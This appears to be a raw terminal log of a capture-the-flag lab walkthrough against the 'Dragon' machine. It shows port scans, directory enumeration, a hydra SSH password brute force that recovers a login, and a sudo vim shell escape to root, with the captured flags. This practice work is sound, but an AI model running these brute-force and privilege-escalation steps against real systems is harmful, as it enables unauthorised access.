──(kali㉿kali)-[~/Documents/dragon]
└─$ nmap -sS -p- --open --min-rate 5000 -n -Pn 10.0.250.10 -oN scan.txt     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 18:09 EDT
Nmap scan report for 10.0.250.10
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:3A:93:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds

==============================================================================================================================                                                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents/dragon]
└─$  nmap -p22,80 -sCV -vvv -Pn -n 10.0.250.9 -oN fullscan.txt 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 18:10 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
Initiating ARP Ping Scan at 18:10
Scanning 10.0.250.9 [1 port]
Completed ARP Ping Scan at 18:10, 1.43s elapsed (1 total hosts)
Nmap scan report for 10.0.250.9 [host down, received no-response]
NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (0 hosts up) scanned in 1.93 seconds
           Raw packets sent: 2 (56B) | Rcvd: 0 (0B)

==============================================================================================================================                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Documents/dragon]
└─$  nmap -p22,80 -sCV -vvv -Pn -n 10.0.250.10 -oN fullscan.txt 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 18:10 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
Initiating ARP Ping Scan at 18:10
Scanning 10.0.250.10 [1 port]
Completed ARP Ping Scan at 18:10, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:10
Scanning 10.0.250.10 [2 ports]
Discovered open port 22/tcp on 10.0.250.10
Discovered open port 80/tcp on 10.0.250.10
Completed SYN Stealth Scan at 18:10, 0.02s elapsed (2 total ports)
Initiating Service scan at 18:10
Scanning 2 services on 10.0.250.10
Completed Service scan at 18:10, 6.03s elapsed (2 services on 1 host)
NSE: Script scanning 10.0.250.10.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.27s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
Nmap scan report for 10.0.250.10
Host is up, received arp-response (0.00038s latency).
Scanned at 2025-09-19 18:10:28 EDT for 7s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:98:c6:f1:55:e6:30:8b:83:c4:69:60:d9:ed:11:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLRB0bNFpMig2oGPoN2EWsh1Ximm6bDgZu/Z9O0twiunyN9X/pMOAC2J9gxyQYQwRu7ey4QtLD4qSFx9PMW1mWc=
|   256 b5:d2:46:75:32:b0:98:b2:8f:61:02:95:cf:ba:19:c6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOmNTndfAjNjQW4vXgoZ0sV+DLTbr9TdMa0mYQDPsstr
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: La M\xC3\xA1quina del Drag\xC3\xB3n
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 08:00:27:3A:93:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:10
Completed NSE at 18:10, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
==============================================================================================================================                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Documents/dragon]
└─$ gobuster dir -u http://10.0.250.10 -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404
===============================================================

===============================================================
/index.html           (Status: 200) [Size: 981]
/secret               (Status: 301) [Size: 311] [--> http://10.0.250.10/secret/]




```bash
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <title>Secreto de Dragon Machine</title>
    <style>
        body {
            background-color: #222;
            color: #eee;
            font-family: 'Courier New', Courier, monospace;
            padding: 2em;
            text-align: center;
        }
        .riddle {
            background-color: #333;
            padding: 2em;
            border-radius: 12px;
            margin: 0 auto;
            max-width: 600px;
            box-shadow: 0 0 10px #f38ba8;
        }
    </style>
</head>
<body>
    <div class="riddle">
        <h1>Para Dragon:</h1>
        <p>“En la sombra de la cueva, un guardián vigila sin ver,<br>
        Su nombre es la clave, su fuerza, un misterio por resolver.<br>
        Intenta sin pausa, las llaves del dragón,<br>
        Y hallarás el secreto que abre la prisión.”</p>
    </div>
</body>
</html>
```


==============================================================================================================================

┌──(kali㉿kali)-[~/Documents/dragon]
└─$ hydra -l dragon -P /usr/share/wordlists/rockyou.txt ssh://10.0.250.10                                                           
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-19 18:14:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.0.250.10:22/
[22][ssh] host: 10.0.250.10   login: dragon   password: shadow
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-19 18:15:13






==============================================================================================================================

┌──(kali㉿kali)-[~/Documents/dragon]
└─$ ssh dragon@10.0.250.10  
The authenticity of host '10.0.250.10 (10.0.250.10)' can't be established.
ED25519 key fingerprint is SHA256:BffrSAW4tUB+TWrywXkSWeUxLcFSs0YSko5us+xdXQo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.250.10' (ED25519) to the list of known hosts.
dragon@10.0.250.10's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of mar 05 ago 2025 08:13:17 UTC

  System load:  0.84               Processes:               105
  Usage of /:   40.7% of 11.21GB   Users logged in:         0
  Memory usage: 9%                 IPv4 address for enp0s3: 192.168.18.184
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

El mantenimiento de seguridad expandido para Applications está desactivado

Se pueden aplicar 80 actualizaciones de forma inmediata.
Para ver estas actualizaciones adicionales, ejecute: apt list --upgradable

Active ESM Apps para recibir futuras actualizaciones de seguridad adicionales.
Vea https://ubuntu.com/esm o ejecute «sudo pro status»


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Aug  5 08:13:55 2025 from 192.168.18.16
==============================================================================================================================

dragon@TheHackersLabs-Dragon:~$ ls
user.txt
dragon@TheHackersLabs-Dragon:~$ cat user.txt 
e1f9c2e8a1d8477f9b3f6cd298f9f3bd

==============================================================================================================================
dragon@TheHackersLabs-Dragon:~$ sudo -l
Matching Defaults entries for dragon on TheHackersLabs-Dragon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dragon may run the following commands on TheHackersLabs-Dragon:
    (ALL) NOPASSWD: /usr/bin/vim
dragon@TheHackersLabs-Dragon:~$ sudo vim -c ':!/bin/sh'

# whoami
root
==============================================================================================================================
# ls
user.txt
# cd /root
# ls
congrats.txt  root.txt
# cat root.txt
7a4d1b35eebf4aefa5f1b0198b0d6c17
# cat congrats.txt
#################################################
#                                               #
#   ¡FELICITACIONES!                            #
#                                               #
#   Has logrado escalar privilegios y obtener   #
#   acceso root en la Máquina Dragón.           #
#                                               #
#    A seguir aprendiendo con mas maquinas      #
#             y practicando                     #   
#                                               #    
#################################################
# 
